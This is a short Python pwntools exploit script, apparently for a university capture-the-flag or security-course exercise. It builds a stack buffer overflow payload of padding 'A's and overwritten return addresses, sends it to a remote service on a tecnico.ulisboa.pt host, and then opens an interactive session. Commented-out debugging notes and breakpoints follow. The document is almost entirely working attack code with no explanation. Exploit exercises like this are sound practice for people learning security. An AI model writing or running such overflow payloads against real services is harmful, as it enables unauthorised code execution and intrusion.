from pwn import *
import sys
p32(0x80485d7)

host ='mustard.stt.rnl.tecnico.ulisboa.pt'
port = '9997'

elf = ELF('./bin')

a = b'A' * 1000 + p32(0x80485d7)

s = b'A' * 76 + p32(0x804a060+1004)

#p32(elf.symbols['win'])

p = remote(host, port)
#p = process("./bin")
#gdb.attach(p)
p.sendline(a)
p.sendline(s)
p.interactive()


#AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

#0x80485d7
#\xd7\x58\x40\x80

#AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\60\a0\04\08
#b *main+80
#b *main+95

